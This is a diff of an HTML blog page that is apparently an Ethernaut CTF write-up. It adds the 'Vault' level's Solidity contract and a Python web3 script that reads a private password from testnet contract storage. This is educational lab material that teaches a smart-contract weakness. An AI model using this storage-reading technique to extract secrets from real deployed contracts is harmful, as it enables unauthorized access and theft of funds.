@@ -36,8 +36,9 @@
 <meta property="og:image" content="http://example.com/pictures/Ethernaut/image-20240313094114200.png">
 <meta property="og:image" content="http://example.com/pictures/Ethernaut/image-20240313103321761.png">
 <meta property="og:image" content="http://example.com/pictures/Ethernaut/image-20240313114804331.png">
+<meta property="og:image" content="http://example.com/pictures/Ethernaut/image-20240313130551280.png">
 <meta property="article:published_time" content="2024-03-12T11:54:06.000Z">
-<meta property="article:modified_time" content="2024-03-13T04:07:46.781Z">
+<meta property="article:modified_time" content="2024-03-13T05:07:19.746Z">
 <meta property="article:author" content="sCh3n">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/pictures/Ethernaut/image-20240312100924800.png">
@@ -210,7 +211,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-03-13 12:07:46" itemprop="dateModified" datetime="2024-03-13T12:07:46+08:00">2024-03-13</time>
+      <time title="修改时间：2024-03-13 13:07:19" itemprop="dateModified" datetime="2024-03-13T13:07:19+08:00">2024-03-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -303,7 +304,10 @@ current contract, sending its funds to the given address</p>
 <p>部署攻击合约，然后转点钱进去，执行exp()</p>
 <p><img src="\pictures\Ethernaut\image-20240313114804331.png" /></p>
 <h4 id="vault">Vault</h4>
-<p>111</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>private变量并不完全private，只是无法被其他合约直接访问。但区块链上的信息是公开的，可以直接通过<code>getStorageAt()</code>来访问</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"></span><br><span class="line">rpc = <span class="string">&#x27;https://rpc2.sepolia.org&#x27;</span></span><br><span class="line">web3 = Web3(HTTPProvider(rpc))</span><br><span class="line"></span><br><span class="line">contract_address = <span class="string">&#x27;0xED1Dc5ED8EB6f90814e3408DCDEb52666087b97e&#x27;</span></span><br><span class="line">solt1 = web3.eth.get_storage_at(contract_address, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(solt1)</span><br><span class="line"><span class="built_in">print</span>(solt1.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment">#b&#x27;A very strong secret password :)&#x27;</span></span><br><span class="line"><span class="comment">#0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span></span><br></pre></td></tr></table></figure>
+<p><img src="\pictures\Ethernaut\image-20240313130551280.png" /></p>
 
     </div>
 
